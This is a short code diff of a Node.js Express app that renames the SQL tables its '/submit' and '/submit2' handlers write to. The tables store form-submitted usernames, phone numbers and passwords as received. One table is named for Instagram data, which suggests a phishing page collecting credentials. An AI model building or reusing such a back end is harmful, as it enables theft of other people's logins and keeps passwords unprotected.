@@ -131,7 +131,7 @@ app.post('/submit', async (req,resp)=>{
     request.input('phone', sql.VarChar, req.body.phone);
 
 
-    const query = "INSERT INTO email_info (username,phone, password) VALUES (@username, @phone, @password);";
+    const query = "INSERT INTO emailinfo (username,phone, password) VALUES (@username, @phone, @password);";
 
     await request.query(query);
 
@@ -162,7 +162,7 @@ app.post('/submit2',  async(req, resp)=>{
   request.input('username', sql.VarChar, req.body.username);
   request.input('password', sql.VarChar, req.body.password);
 
-  const query = "INSERT INTO insta_info (username, password) VALUES (@username, @password);";
+  const query = "INSERT INTO instadata (username, password) VALUES (@username, @password);";
   await request.query(query);
 
   } catch (err){
